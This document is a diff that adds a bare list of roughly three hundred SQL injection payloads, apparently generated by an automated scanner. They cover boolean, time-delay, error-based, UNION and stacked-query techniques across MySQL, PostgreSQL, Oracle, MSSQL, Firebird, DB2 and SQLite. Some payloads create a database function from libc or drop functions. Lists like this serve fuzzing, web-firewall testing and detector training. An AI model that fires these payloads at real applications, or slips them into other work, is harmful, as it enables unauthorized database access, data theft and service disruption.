@@ -1,0 +1,2170 @@
+-2307'))) or 6872=6872 and ((('fyok' like 'fyok
+1) or (select * from (select(sleep(5)))ydpu) and (7079=7079
+-4135'))) union all select 4413,4413,4413#
+1')(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ('sstt'='sstt
+-8833')) union all select 3227,3227,3227,3227,3227--
+1;select count(*) from generate_series(1,5000000)
+1%" or elt(6272=6272,sleep(5)) and "%"="
+1" where 3274=3274 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--
+1"));begin dbms_lock.sleep(5); end--
+1))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (((1205=1205
+1");select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ("gzhp"="gzhp
+-3074')) union all select 6131,6131,6131,6131,6131,6131,6131--
+1") as rnte where 6517=6517 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+1%' union all select null,null,null,null,null,null,null,null,null,null--
+1%' and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and '%'='
+1'+(select 'tbfj' where 4016=4016;select (case when (3855=3855) then 3855 else 1/(select 0) end)--
+1%';select (case when (9490=6134) then 9490 else cast(1 as int)/(select 0 from dual) end) from dual--
+1") and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ("lsca" like "lsca
+-9393' where 3119=3119 or 8571=8571--
+-6492') union all select 7204,7204--
+1%" or sleep(5)#
+-7633') as aslj where 2317=2317 or 8571=8571--
+1%'));select (case when (3444=8424) then 3444 else 3444*(select 3444 from information_schema.character_sets) end)#
+1) where 7425=7425 union all select null,null,null,null,null,null,null,null,null,null--
+-7323%" or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and "%"="
+1";call regexp_substring(repeat(right(char(3702),0),500000000),null)
+1%")) or sleep(5) and (("%"="
+1' or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'aezm' like 'aezm
+1"))) or sleep(5) and ((("eran"="eran
+1%';select case when 7717=7717 then 1 else null end--
+1%')));iif(5257=5257,1,1/0)
+1') as rbpx where 1264=1264;begin dbms_lock.sleep(5); end--
+1") as sstd where 9629=9629 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--
+1');select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and ('hmsu'='hmsu
+-1134" union all select 4865,4865,4865,4865,4865#
+1)) as xyuy where 6894=6894;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--
+1') as inid where 7812=7812 or 6793=(select 6793 from pg_sleep(5))--
+-3475" or elt(5532=4242,4242)
+1") where 2016=2016 and (1547=2093)*2093--
+1 where 6383=6383 or elt(6272=6272,sleep(5))--
+(select chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7812=7812) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113) from dual)
+1%")) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (("%"="
+1')) and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+-5064) as mzxc where 1889=1889 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1'||(select 'kitk' where 6311=6311;select * from generate_series(8147,8147,case when (8147=6336) then 1 else 0 end) limit 1--
+1')) or 8421=(select count(*) from generate_series(1,5000000)) and (('uorw' like 'uorw
+-5798" or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))
+1' or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and 'esjl'='esjl
+-3921') as audo where 7087=7087 or 1755=4937--
+-7659') as bowy where 4835=4835 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--
+1 where 6500=6500;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((("fcpm"="fcpm
+1"))) rlike (select (case when (7975=2446) then 1 else 0x28 end)) and ((("qixm" like "qixm
+1%'));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and (('%'='
+-6218')) or 2236=4469#
+-3234%")) or elt(1032=1032,3623) and (("%"="
+1') as fkpn where 1100=1100;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--
+1")) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (("yrgy" like "yrgy
+1")) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (("uquh"="uquh
+1,extractvalue(9788,concat(0x5c,0x7171706a71,(select (elt(9788=9788,1))),0x717a767a71))
+1'))) and sleep(5)#
+1%' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and '%'='
+1" union all select null,null,null,null,null,null,null,null,null#
+-6145 or (8459=8459)*4906-- yklv
+1)) as qsos where 2721=2721 rlike (select * from (select(sleep(5)))sgvo)--
+1');(select * from (select(sleep(5)))srmq)
+1') as xwlf where 9424=9424;(select * from (select(sleep(5)))acdk)#
+(select (case when (6581=6581) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)
+1') where 8586=8586 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--
+1";waitfor delay '0:0:5' and "lhcv"="lhcv
+1'||(select 'uedy' where 8816=8816;select case when 6558=4327 then 1 else null end--
+1%' and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and '%'='
+1")) and (select * from (select(sleep(5)))fzno) and (("dyoe"="dyoe
+1"));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (("zzmn"="zzmn
+1")) or elt(6272=6272,sleep(5)) and (("chvi" like "chvi
+1' in boolean mode) and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)#
+1;select benchmark(5000000,md5(0x4c4d6142))
+1%")));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((("%"="
+1') or sleep(5)
+-4670")) or 3038=3038
+-2140)) union all select 8174,8174,8174#
+1%"));select sleep(5) and (("%"="
+1")) as rrms where 8185=8185 union all select null,null,null,null,null,null,null,null--
+1')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--
+1")) as phis where 4420=4420 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--
+1' union all select null,null,null,null#
+1'+(select 'qpxk' where 7139=7139 procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1))+'
+1") as eibf where 5026=5026 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--
+1%') and 8635=(select count(*) from generate_series(1,5000000))--
+-7482"))) or 9077=2651
+1)) as dhge where 4816=4816 and 2388=benchmark(5000000,md5(0x6d457153))#
+-1564') order by 1--
+-3884" where 8012=8012 union all select 8012,8012#
+1")) as hdyn where 6027=6027 union all select null,null,null--
+1%')) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (('%'='
+1) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)
+1) where 6082=6082 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--
+1'||(select 'gboi' where 4191=4191 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3))||'
+1') where 4500=4500;iif(5257=5257,1,1/0)
+1)) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((6010=6010
+-9011")) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#
+1') as nvqk where 3917=3917 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1') where 9842=9842 union all select null,null,null,null,null,null,null,null#
+1' in boolean mode) union all select null,null,null#
+-3628" or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))
+-4108') or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ('tqjx'='tqjx
+1' where 3700=3700 union all select null,null,null--
+1")) as vbdo where 3882=3882;(select * from (select(sleep(5)))srmq)--
+1) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (5098=5098
+1%' or 6793=(select 6793 from pg_sleep(5)) and '%'='
+-4562') or 3038=3038
+-4641") where 4212=4212 or make_set(3595=4062,4062)--
+-5356') or 9323=9323#
+1');select sleep(5) and ('vwmx'='vwmx
+1);call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (8503=8503
+1'+(select xlvq where 7470=7470 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3))+'
+1')) and 2832=4165--
+1)) as fmpr where 3103=3103 and elt(9970=9297,9297)--
+1);select count(*) from generate_series(1,5000000)--
+1'+(select 'mtpt' where 7483=7483 union all select null,null,null,null,null,null,null,null,null--
+1%');select like('abcdefg',upper(hex(randomblob(500000000/2))))--
+-8043%"))) or make_set(9354=9354,7185) and ((("%"="
+1)) as izvy where 2569=2569;begin user_lock.sleep(5); end--
+1) where 7096=7096;begin user_lock.sleep(5); end--
+1))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((3504=3504
+1" where 3018=3018 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--
+1')) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1'))) union all select null,null,null,null--
+1"))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((("umne" like "umne
+1%')) or (select * from (select(sleep(5)))ydpu) and (('%'='
+1') or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+-1148")) union all select 5442,5442,5442,5442#
+1';(select * from (select(sleep(5)))srmq) and 'mcrt'='mcrt
+1) where 9059=9059 and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71))--
+1" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and "jbty" like "jbty
+1 where 1015=1015;select pg_sleep(5)--
+1") or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ("dnmi" like "dnmi
+1")) and elt(3785=9386,9386) and (("inwa" like "inwa
+-8773%'))) union all select 8941,8941,8941,8941,8941,8941#
+1') and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ('hbld'='hbld
+-7808")) as jgkk where 9230=9230 or elt(1032=1032,3623)--
+1' where 7176=7176;select pg_sleep(5)--
+1")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ((("kfdh" like "kfdh
+1)) as vzgo where 6281=6281 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1%") and 3824=benchmark(5000000,md5(0x76555642)) and ("%"="
+-5225')) as zats where 5629=5629 union all select 5629,5629,5629,5629,5629--
+1) where 6954=6954 and 3824=benchmark(5000000,md5(0x76555642))--
+1"))) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ('ylit' like 'ylit
+1')) as jtmf where 3937=3937;select case when 7717=7717 then 1 else null end--
+1"))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((("epwi" like "epwi
+-9331' or (4519=2912)*2912 and 'rddk'='rddk
+1';select sleep(5) and 'eskp' like 'eskp
+-6436' in boolean mode) union all select 7589,7589,7589,7589--
+1" or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and "cgpm" like "cgpm
+1'+(select enzd where 6046=6046 and (3020=3020)*6703)+'
+1") where 4964=4964;(select * from (select(sleep(5)))srmq)--
+-2898" where 3301=3301 union all select 3301,3301,3301,3301,3301,3301,3301,3301,3301,3301#
+1,(select (case when (5217=5217) then 1 else 5217*(select 5217 from mysql.db) end))
+1' in boolean mode) or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--
+-5190%" or 8298=9306 and "%"="
+1'||(select 'omeg' from dual where 4751=4751;select pg_sleep(5))||'
+1%'))) or 8421=(select count(*) from generate_series(1,5000000)) and ((('%'='
+-8245")) or 3038=3038
+-2864') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('vjbl'='vjbl
+1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('qutm'='qutm
+1")) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--
+1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('rjjo'='rjjo
+1')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('yhku' like 'yhku
+1")) as chal where 6661=6661;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1'))) or sleep(5)#
+1" where 1203=1203 union all select null,null,null--
+1";begin user_lock.sleep(5); end
+1%';if(6842=5446) select 6842 else drop function vjfq--
+1")) and elt(1210=1210,sleep(5)) and (("utlk" like "utlk
+-8327 where 7555=7555 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--
+1' where 1045=1045 or 6793=(select 6793 from pg_sleep(5))--
+1')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('yzdp'='yzdp
+-6534%')) or make_set(4107=9457,9457) and (('%'='
+1) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))
+1'))) or sleep(5) and ((('ecur'='ecur
+1")) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (("kpwc" like "kpwc
+1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--
+1) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (5132=5132
+-1483' or make_set(9354=9354,7185) and 'qfil'='qfil
+1' in boolean mode) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)#
+1);select (case when (2056=1917) then 2056 else 1/(select 0) end)--
+-6637')) order by 1#
+1")) and make_set(8403=8403,8899) and (("nsyl"="nsyl
+make_set(8734=8734,sleep(5))
+1')) as bewk where 3672=3672 or sleep(5)--
+1') as wnys where 6457=6457 or 8514=benchmark(5000000,md5(0x544d5a4c))#
+-8454" or 6872=6872
+1%" union all select null,null,null,null,null,null,null,null--
+-7499%") union all select 1893,1893,1893,1893,1893#
+1"));select (case when (3565=4053) then 3565 else cast(1 as int)/(select 0 from dual) end) from dual--
+1')) procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (('asdc' like 'asdc
+1'+(select 'qvif' where 1758=1758 union all select null,null,null,null,null,null,null,null#
+1" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and "exgr" like "exgr
+1'));select case when 7717=7717 then 1 else null end--
+1%"))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
+-5350)) or 9323=9323#
+1' or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and 'uwep'='uwep
+1' and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and 'ukxj'='ukxj
+-7661" union all select 9551,9551,9551#
+1' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and 'hzav'='hzav
+1'));(select * from (select(sleep(5)))srmq) and (('stea'='stea
+1 and 8189=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--
+1)));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--
+1');select count(*) from generate_series(1,5000000) and ('tnvm' like 'tnvm
+-8793' where 3853=3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#
+-5708 where 3134=3134 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--
+1" or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))
+-1772)) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((8904=8904
+-8838")) as xisn where 2749=2749 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--
+1"));select (case when (3499=4209) then 3499 else 3499*(select 3499 from mysql.db) end)#
+1'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('nlky' like 'nlky
+1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('rqyz'='rqyz
+-1796') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('lpuw' like 'lpuw
+1) where 1402=1402;select sleep(5)#
+1%');select (case when (9986=8342) then 9986 else 9986*(select 9986 from information_schema.character_sets) end)#
+1 where 7055=7055;select (case when (4666=4666) then 1 else 4666*(select 4666 from master..sysdatabases) end)--
+1%';select count(*) from generate_series(1,5000000) and '%'='
+-9557%"))) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((("%"="
+1')) as cimd where 9608=9608;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1' and (3423=7789)*7789 and 'pdia' like 'pdia
+-7901) order by 1--
+1" and make_set(4214=9503,9503) and "phjg" like "phjg
+1 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)# mafe
+-1765') order by 1--
+1')) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (('brlc'='brlc
+1")) waitfor delay '0:0:5' and (("witb"="witb
+1%' and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and '%'='
+1 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1' in boolean mode) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#
+1%' and 2388=benchmark(5000000,md5(0x6d457153))#
+1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)
+-9966')) union all select 7230,7230,7230,7230,7230,7230,7230#
+-9434') union all select 3106#
+1'+(select 'ejox' where 2719=2719 union all select null,null,null#
+1") where 5870=5870 union all select null,null,null--
+-7065'+(select 'bdxr' where 1756=1756 union all select 1756,1756,1756,1756,1756,1756,1756,1756,1756,1756#
+-9672%"))) order by 1#
+-6123" or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and "zuzx"="zuzx
+1) as ghew where 6441=6441 union all select null,null--
+1%');select count(*) from generate_series(1,5000000)--
+1%"))) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ((("%"="
+-5336') where 8691=8691 or 3608=1887--
+-1808%")) or 4595=3545 and (("%"="
+-1072%")) or 3090=3539
+1' where 8537=8537 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--
+1) or (select * from (select(sleep(5)))sddo)#
+-5231%" or 4945=8402#
+1%" and 5411=7697 and "%"="
+1') where 8142=8142 waitfor delay '0:0:5'--
+1) where 2940=2940;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--
+elt(5953=5953,1)
+1 and 3824=benchmark(5000000,md5(0x76555642))# igen
+1))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (((8738=8738
+1' in boolean mode) union all select null,null#
+1")) as wooq where 7671=7671 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--
+1')) or (select * from (select(sleep(5)))ydpu) and (('ytxg'='ytxg
+1" where 9521=9521 or (select * from (select(sleep(5)))ydpu)--
+elt(8192=8192,sleep(5))
+1') as sruz where 6318=6318;select (case when (6287=8341) then 6287 else 1/(select 0) end)--
+1")) as hzcq where 9250=9250 and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--
+1'))) or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((('zfrs'='zfrs
+1%");begin user_lock.sleep(5); end--
+1%'));waitfor delay '0:0:5' and (('%'='
+1 rlike (select (case when (7689=7689) then 1 else 0x28 end))# mekk
+1%') union all select null,null,null,null,null,null,null,null,null#
+1")) as nejd where 2885=2885;select like('abcdefg',upper(hex(randomblob(500000000/2))))--
+1')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('bgdp'='bgdp
+1" or 8421=(select count(*) from generate_series(1,5000000)) and "cdai"="cdai
+1")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((("mkal" like "mkal
+1) as ilqx where 8547=8547;select count(*) from generate_series(1,5000000)--
+1") where 7010=7010 and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1%' or elt(6272=6272,sleep(5)) and '%'='
+1" union all select null,null,null--
+1" or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and "zyoo"="zyoo
+-1258")) union all select 7734,7734,7734#
+-8523) as hzqs where 8944=8944 order by 1--
+1 and sleep(5)#
+1') where 8086=8086 and 1430=7941--
+1') where 8268=8268 union all select null,null,null,null--
+1%'));begin user_lock.sleep(5); end and (('%'='
+1' and (5116=1602)*1602
+1%' or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--
+1 or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x))
+-1051") where 6586=6586 or 6647=6738#
+-6310 or 6715=3399
+1') as jztg where 1222=1222 or sleep(5)#
+1")) as uqkn where 4642=4642 or elt(6272=6272,sleep(5))--
+1" and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and "lgwe" like "lgwe
+1%") procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#
+1' where 4115=4115;select (case when (2501=4688) then 2501 else cast(1 as int)/(select 0 from dual) end) from dual--
+-4856' in boolean mode) union all select 1074,1074,1074,1074,1074,1074,1074#
+1%') and elt(3114=3114,sleep(5))#
+1) as kjsd where 1670=1670 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--
+1))) union all select null#
+1) and elt(1210=1210,sleep(5))
+1' where 6116=6116;select (case when (7033=1594) then 7033 else 7033*(select 7033 from information_schema.character_sets) end)#
+1%'))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and ((('%'='
+-5580 or 4829=1968
+1%'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('%'='
+1')) as hrra where 9533=9533 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--
+1%"))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ((("%"="
+1)) as spdf where 8554=8554 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--
+1'||(select 'fjlg' from dual where 9517=9517;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--
+1') rlike (select * from (select(sleep(5)))sgvo) and ('cmqe' like 'cmqe
+1%" and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and "%"="
+1") and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and ("imlx"="imlx
+1') where 3579=3579 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--
+1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('owga' like 'owga
+1'||(select 'xmoq' from dual where 8047=8047 and 7533=7533)||'
+1' and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and 'ccsb'='ccsb
+1%') and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ('%'='
+1' where 2134=2134 rlike (select (case when (3613=2090) then 1 else 0x28 end))--
+-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--
+1')) as kdse where 6767=6767 rlike sleep(5)#
+1%')) and 3721=2597#
+-9514)) as xdkw where 4975=4975 union all select 4975,4975,4975,4975#
